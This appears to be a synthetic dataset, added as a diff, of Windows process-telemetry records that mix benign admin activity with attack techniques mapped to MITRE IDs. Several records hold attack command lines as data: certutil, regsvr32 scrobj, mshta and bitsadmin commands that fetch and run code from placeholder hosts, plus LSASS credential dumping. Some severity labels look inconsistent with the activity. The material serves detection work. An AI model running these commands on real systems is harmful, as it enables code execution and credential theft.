@@ -1,0 +1,606 @@
+[
+  {
+    "id": 1014,
+    "title": "MSBuild post-build PowerShell script (Dev pipeline)",
+    "category": "Dev Tooling",
+    "severity": "Medium",
+    "host": "HR-02",
+    "user": "dev.build",
+    "pid": 12140,
+    "ppid": 3851,
+    "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
+    "command_line": "MSBuild.exe MyApp.csproj /t:Build",
+    "hash": "8f14e45fceea167a5a36dedd4bea2543",
+    "start_time": "2025-11-09T02:01:45Z",
+    "kill_chain": [
+      "Build Automation"
+    ],
+    "process_tree": [
+      "devshell.exe",
+      "MSBuild.exe",
+      "powershell.exe -File .\\\\postbuild.ps1"
+    ],
+    "exec_flow": [
+      "Build completes",
+      "postbuild.ps1 runs",
+      "Sign artifacts"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Expected CI/CD step."
+  },
+  {
+    "id": 1013,
+    "title": "ProcDump used to capture w3wp.exe for troubleshooting",
+    "category": "Sysinternals ProcDump",
+    "severity": "High",
+    "host": "WS-07",
+    "user": "it.ops",
+    "pid": 11228,
+    "ppid": 1002,
+    "image": "C:\\Tools\\Sysinternals\\procdump64.exe",
+    "command_line": "procdump64.exe -ma w3wp.exe C:\\Temp\\w3wp.dmp",
+    "hash": "7b8b965ad4bca0e41ab51de7b31363a1",
+    "start_time": "2025-11-09T01:53:45Z",
+    "kill_chain": [
+      "Diagnostics"
+    ],
+    "process_tree": [
+      "cmd.exe",
+      "procdump64.exe \u2192 w3wp.exe"
+    ],
+    "exec_flow": [
+      "Open handle",
+      "Write IIS dump"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Target is IIS, not LSASS."
+  },
+  {
+    "id": 1010,
+    "title": "LOLBIN: installutil runs malicious assembly",
+    "category": "LOLBIN (installutil)",
+    "severity": "High",
+    "host": "SRV-FILE01",
+    "user": "dev.build",
+    "pid": 15228,
+    "ppid": 3289,
+    "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+    "command_line": "InstallUtil.exe /logfile= /LogToConsole=false C:\\Users\\Public\\evil.dll",
+    "hash": "1679091c5a880faf6fb5e6087eb1b2dc",
+    "start_time": "2025-11-09T02:25:45Z",
+    "kill_chain": [
+      "Execution"
+    ],
+    "process_tree": [
+      "cmd.exe",
+      "InstallUtil.exe \u2192 evil.dll"
+    ],
+    "exec_flow": [
+      "Load assembly",
+      "Execute installer hooks"
+    ],
+    "mitre": [
+      "T1218.001"
+    ],
+    "notes": "Proxy exec via InstallUtil."
+  },
+  {
+    "id": 1011,
+    "title": "Backup agent bulk file reads & HTTPS upload to cloud",
+    "category": "Backup Agent",
+    "severity": "Critical",
+    "host": "SRV-DC01",
+    "user": "svc_backup",
+    "pid": 11448,
+    "ppid": 3721,
+    "image": "C:\\Program Files\\BackupCo\\agent.exe",
+    "command_line": "agent.exe --job daily --dest https://backup.backupco.com",
+    "hash": "6f1ed002ab5595859014ebf0951522d9",
+    "start_time": "2025-11-09T01:33:45Z",
+    "kill_chain": [
+      "Collection-like but expected"
+    ],
+    "process_tree": [
+      "services.exe",
+      "agent.exe",
+      "TLS to backupco"
+    ],
+    "exec_flow": [
+      "Enumerate dirs",
+      "Encrypt & compress",
+      "Upload to backup"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Legitimate enterprise backup."
+  },
+  {
+    "id": 1018,
+    "title": "LOLBIN: mshta launches corporate enrollment page",
+    "category": "LOLBIN (mshta)",
+    "severity": "Low",
+    "host": "ENG-03",
+    "user": "helpdesk",
+    "pid": 10493,
+    "ppid": 2548,
+    "image": "C:\\Windows\\System32\\mshta.exe",
+    "command_line": "mshta https://enroll.corp/JoinDevice.hta",
+    "hash": "6512bd43d9caa6e02c990b0a82652dca",
+    "start_time": "2025-11-09T01:57:45Z",
+    "kill_chain": [
+      "IT Enrollment"
+    ],
+    "process_tree": [
+      "control.exe",
+      "mshta.exe"
+    ],
+    "exec_flow": [
+      "Open corp HTA",
+      "Device join flow"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Trusted domain & signed content."
+  },
+  {
+    "id": 1003,
+    "title": "Dropper downloads and stages second-stage payload",
+    "category": "Dropper",
+    "severity": "Medium",
+    "host": "WS-07",
+    "user": "svc_update",
+    "pid": 11449,
+    "ppid": 2294,
+    "image": "C:\\ProgramData\\svc\\updater.exe",
+    "command_line": "updater.exe /silent /url http://198.51.100.50/payload.bin",
+    "hash": "5d41402abc4b2a76b9719d911017c592",
+    "start_time": "2025-11-09T01:51:45Z",
+    "kill_chain": [
+      "Command and Control",
+      "Execution"
+    ],
+    "process_tree": [
+      "taskeng.exe",
+      "updater.exe",
+      "payload.exe"
+    ],
+    "exec_flow": [
+      "Fetch payload",
+      "Write to ProgramData",
+      "Spawn payload.exe"
+    ],
+    "mitre": [
+      "T1105"
+    ],
+    "notes": "Unsigned updater staging remote payload."
+  },
+  {
+    "id": 1006,
+    "title": "LOLBIN: certutil downloads remote payload",
+    "category": "LOLBIN (certutil)",
+    "severity": "Low",
+    "host": "SRV-DC01",
+    "user": "helpdesk",
+    "pid": 11866,
+    "ppid": 2214,
+    "image": "C:\\Windows\\System32\\certutil.exe",
+    "command_line": "certutil -urlcache -split -f http://198.51.100.60/a.bin C:\\Users\\Public\\a.bin",
+    "hash": "4a7d1ed414474e4033ac29ccb8653d9b",
+    "start_time": "2025-11-09T02:13:45Z",
+    "kill_chain": [
+      "Command and Control",
+      "Execution"
+    ],
+    "process_tree": [
+      "powershell.exe",
+      "certutil.exe"
+    ],
+    "exec_flow": [
+      "Fetch via HTTP",
+      "Write to Public folder"
+    ],
+    "mitre": [
+      "T1105",
+      "T1218.004"
+    ],
+    "notes": "Proxy exec / ingress transfer."
+  },
+  {
+    "id": 1017,
+    "title": "LOLBIN: regsvr32 registers vendor DLL (signed)",
+    "category": "LOLBIN (regsvr32)",
+    "severity": "Critical",
+    "host": "HR-02",
+    "user": "it.ops",
+    "pid": 13077,
+    "ppid": 3003,
+    "image": "C:\\Windows\\System32\\regsvr32.exe",
+    "command_line": "regsvr32 /s C:\\Program Files\\Vendor\\Plugin.dll",
+    "hash": "45c48cce2e2d7fbdea1afc51c7c6ad26",
+    "start_time": "2025-11-09T01:49:45Z",
+    "kill_chain": [
+      "Maintenance"
+    ],
+    "process_tree": [
+      "msiexec.exe",
+      "regsvr32.exe"
+    ],
+    "exec_flow": [
+      "Register signed COM DLL"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Vendor-signed component."
+  },
+  {
+    "id": 1005,
+    "title": "Hookchain.exe injects code into explorer.exe",
+    "category": "Process Injection",
+    "severity": "Critical",
+    "host": "HR-02",
+    "user": "dev.build",
+    "pid": 10084,
+    "ppid": 1161,
+    "image": "C:\\Users\\Public\\Hookchain.exe",
+    "command_line": "Hookchain.exe /target:explorer.exe /tech:ThreadHijack",
+    "hash": "e2fc714c4727ee9395f324cd2e7f331f",
+    "start_time": "2025-11-09T02:05:45Z",
+    "kill_chain": [
+      "Execution",
+      "Privilege Escalation",
+      "Defense Evasion"
+    ],
+    "process_tree": [
+      "powershell.exe",
+      "Hookchain.exe",
+      "Thread hijack \u2192 explorer.exe"
+    ],
+    "exec_flow": [
+      "Alloc RWX",
+      "Write shellcode",
+      "Hijack thread"
+    ],
+    "mitre": [
+      "T1055",
+      "T1055.003"
+    ],
+    "notes": "RWX & thread hijack."
+  },
+  {
+    "id": 1004,
+    "title": "LSASS memory dump via alternate method (mimikatz variant)",
+    "category": "Credential Access",
+    "severity": "Critical",
+    "host": "WS-07",
+    "user": "Administrator",
+    "pid": 17162,
+    "ppid": 2640,
+    "image": "C:\\Windows\\Temp\\minidump64.exe",
+    "command_line": "minidump64.exe lsass.exe C:\\Temp\\lsass_alt.dmp --snapshot",
+    "hash": "098f6bcd4621d373cade4e832627b4f6",
+    "start_time": "2025-11-09T01:59:45Z",
+    "kill_chain": [
+      "Credential Access"
+    ],
+    "process_tree": [
+      "cmd.exe",
+      "minidump64.exe \u2192 handle to lsass.exe"
+    ],
+    "exec_flow": [
+      "Open LSASS with SeDebugPrivilege",
+      "Write lsass_alt.dmp"
+    ],
+    "mitre": [
+      "T1003.001"
+    ],
+    "notes": "Alt method akin to mimikatz minidump."
+  },
+  {
+    "id": 1020,
+    "title": "LOLBIN: bitsadmin used by Windows Update",
+    "category": "LOLBIN (bitsadmin)",
+    "severity": "Medium",
+    "host": "LAP-DEV01",
+    "user": "svc_update",
+    "pid": 17511,
+    "ppid": 4636,
+    "image": "C:\\Windows\\System32\\bitsadmin.exe",
+    "command_line": "bitsadmin /monitor /allusers",
+    "hash": "c51ce410c124a10e0db5e4b97fc2af39",
+    "start_time": "2025-11-09T02:11:45Z",
+    "kill_chain": [
+      "System Update"
+    ],
+    "process_tree": [
+      "svchost.exe (wuauserv)",
+      "bitsadmin.exe"
+    ],
+    "exec_flow": [
+      "Monitor BITS jobs for update"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "OS update activity."
+  },
+  {
+    "id": 1008,
+    "title": "LOLBIN: mshta loads remote HTA executing commands",
+    "category": "LOLBIN (mshta)",
+    "severity": "Critical",
+    "host": "QA-05",
+    "user": "svc_backup",
+    "pid": 4819,
+    "ppid": 1603,
+    "image": "C:\\Windows\\System32\\mshta.exe",
+    "command_line": "mshta http://198.51.100.90/portal.hta",
+    "hash": "a87ff679a2f3e71d9181a67b7542122c",
+    "start_time": "2025-11-09T02:19:45Z",
+    "kill_chain": [
+      "Execution"
+    ],
+    "process_tree": [
+      "winword.exe",
+      "mshta.exe"
+    ],
+    "exec_flow": [
+      "Load remote HTA",
+      "Execute embedded script"
+    ],
+    "mitre": [
+      "T1218.005"
+    ],
+    "notes": "Remote HTA execution."
+  },
+  {
+    "id": 1001,
+    "title": "Unsigned loader installs vulnerable signed driver (BYOVD)",
+    "category": "BYOVD",
+    "severity": "Low",
+    "host": "WS-19",
+    "user": "dev.build",
+    "pid": 13943,
+    "ppid": 1149,
+    "image": "C:\\Windows\\Temp\\drvloader.exe",
+    "command_line": "drvloader.exe /install C:\\Temp\\gdrv.sys",
+    "hash": "d41d8cd98f00b204e9800998ecf8427e",
+    "start_time": "2025-11-09T01:28:45Z",
+    "kill_chain": [
+      "Initial Execution",
+      "Privilege Escalation",
+      "Defense Evasion"
+    ],
+    "process_tree": [
+      "explorer.exe (PPID)",
+      "drvloader.exe",
+      "sc.exe create gdrv",
+      "sc.exe start gdrv"
+    ],
+    "exec_flow": [
+      "Writes gdrv.sys",
+      "Loads vulnerable driver",
+      "Kernel R/W primitive"
+    ],
+    "mitre": [
+      "T1068",
+      "T1547.006"
+    ],
+    "notes": "BYOVD used for kernel primitives."
+  },
+  {
+    "id": 1012,
+    "title": "Driver update utility installing vendor-signed driver",
+    "category": "Driver Update",
+    "severity": "Medium",
+    "host": "SRV-FILE01",
+    "user": "it.ops",
+    "pid": 3224,
+    "ppid": 4496,
+    "image": "C:\\Program Files\\Vendor\\DrvUpdate.exe",
+    "command_line": "DrvUpdate.exe /install /reboot",
+    "hash": "1dcca23355272056f04fe8bf20edfce0",
+    "start_time": "2025-11-09T01:45:45Z",
+    "kill_chain": [
+      "Maintenance"
+    ],
+    "process_tree": [
+      "explorer.exe",
+      "DrvUpdate.exe",
+      "svchost.exe \u2192 driver install"
+    ],
+    "exec_flow": [
+      "Verify signatures",
+      "Install vendor driver",
+      "Request reboot"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Vendor-signed driver update."
+  },
+  {
+    "id": 1007,
+    "title": "LOLBIN: regsvr32 executes remote scrobj COM script",
+    "category": "LOLBIN (regsvr32)",
+    "severity": "High",
+    "host": "QA-05",
+    "user": "analyst",
+    "pid": 8829,
+    "ppid": 3576,
+    "image": "C:\\Windows\\System32\\regsvr32.exe",
+    "command_line": "regsvr32 /s /n /u /i:http://203.0.113.77/file.sct scrobj.dll",
+    "hash": "03c7c0ace395d80182db07ae2c30f034",
+    "start_time": "2025-11-09T02:17:45Z",
+    "kill_chain": [
+      "Execution"
+    ],
+    "process_tree": [
+      "cmd.exe",
+      "regsvr32.exe \u2192 scrobj.dll"
+    ],
+    "exec_flow": [
+      "Pull remote scriptlet",
+      "Execute via COM registration-free"
+    ],
+    "mitre": [
+      "T1218.010"
+    ],
+    "notes": "Remote scriptlet via regsvr32."
+  },
+  {
+    "id": 1002,
+    "title": "DLL injection into notepad.exe using CreateRemoteThread",
+    "category": "DLL Injection",
+    "severity": "Medium",
+    "host": "QA-05",
+    "user": "dev.build",
+    "pid": 6630,
+    "ppid": 2440,
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "rundll32.exe C:\\Users\\Public\\gdi32plus.dll,EntryPoint",
+    "hash": "9e107d9d372bb6826bd81d3542a419d6",
+    "start_time": "2025-11-09T01:43:45Z",
+    "kill_chain": [
+      "Execution",
+      "Privilege Escalation",
+      "Defense Evasion"
+    ],
+    "process_tree": [
+      "winword.exe",
+      "rundll32.exe",
+      "CreateRemoteThread \u2192 notepad.exe"
+    ],
+    "exec_flow": [
+      "VirtualAllocEx/WriteProcessMemory",
+      "CreateRemoteThread"
+    ],
+    "mitre": [
+      "T1055.001"
+    ],
+    "notes": "Office \u2192 rundll32 with remote thread."
+  },
+  {
+    "id": 1015,
+    "title": "Remote admin tool pushes patch via PsExec-like service",
+    "category": "IT Remote Admin",
+    "severity": "Medium",
+    "host": "QA-05",
+    "user": "it.ops",
+    "pid": 3321,
+    "ppid": 3718,
+    "image": "C:\\AdminTools\\RmtExec.exe",
+    "command_line": "RmtExec.exe \\\\WS-19 --cmd \"msiexec /i patch.msi /qn\"",
+    "hash": "1679091c5a880faf6fb5e6087eb1b2dc",
+    "start_time": "2025-11-09T02:09:45Z",
+    "kill_chain": [
+      "Remote Management"
+    ],
+    "process_tree": [
+      "mmc.exe",
+      "RmtExec.exe",
+      "RmtExecSvc (remote)"
+    ],
+    "exec_flow": [
+      "Create remote service",
+      "Install MSI"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Managed maintenance window."
+  },
+  {
+    "id": 1016,
+    "title": "LOLBIN: certutil verifies certificate chain for VPN",
+    "category": "LOLBIN (certutil)",
+    "severity": "Low",
+    "host": "ENG-03",
+    "user": "helpdesk",
+    "pid": 3463,
+    "ppid": 5292,
+    "image": "C:\\Windows\\System32\\certutil.exe",
+    "command_line": "certutil -verify myvpn.cer",
+    "hash": "c4ca4238a0b923820dcc509a6f75849b",
+    "start_time": "2025-11-09T01:35:45Z",
+    "kill_chain": [
+      "IT Support"
+    ],
+    "process_tree": [
+      "powershell.exe",
+      "certutil.exe"
+    ],
+    "exec_flow": [
+      "Load certificate",
+      "Verify chain"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Benign certificate verification."
+  },
+  {
+    "id": 1009,
+    "title": "LOLBIN: bitsadmin transfers staged binary",
+    "category": "LOLBIN (bitsadmin)",
+    "severity": "High",
+    "host": "HR-02",
+    "user": "jdoe",
+    "pid": 15823,
+    "ppid": 2319,
+    "image": "C:\\Windows\\System32\\bitsadmin.exe",
+    "command_line": "bitsadmin /transfer j1 http://203.0.113.88/p.bin C:\\Temp\\p.bin",
+    "hash": "e4da3b7fbbce2345d7772b0674a318d5",
+    "start_time": "2025-11-09T02:23:45Z",
+    "kill_chain": [
+      "Command and Control"
+    ],
+    "process_tree": [
+      "powershell.exe",
+      "bitsadmin.exe"
+    ],
+    "exec_flow": [
+      "Create BITS job",
+      "Download binary to Temp"
+    ],
+    "mitre": [
+      "T1105",
+      "T1197"
+    ],
+    "notes": "Abuse of BITS for transfer."
+  },
+  {
+    "id": 1019,
+    "title": "LOLBIN: rundll32 opens Control Panel applet",
+    "category": "LOLBIN (rundll32)",
+    "severity": "High",
+    "host": "WS-19",
+    "user": "helpdesk",
+    "pid": 9783,
+    "ppid": 2473,
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl",
+    "hash": "c20ad4d76fe97759aa27a0c99bff6710",
+    "start_time": "2025-11-09T02:03:45Z",
+    "kill_chain": [
+      "Support"
+    ],
+    "process_tree": [
+      "explorer.exe",
+      "rundll32.exe"
+    ],
+    "exec_flow": [
+      "Invoke Control Panel applet"
+    ],
+    "mitre": [
+      "N/A"
+    ],
+    "notes": "Legitimate applet invocation."
+  }
+]
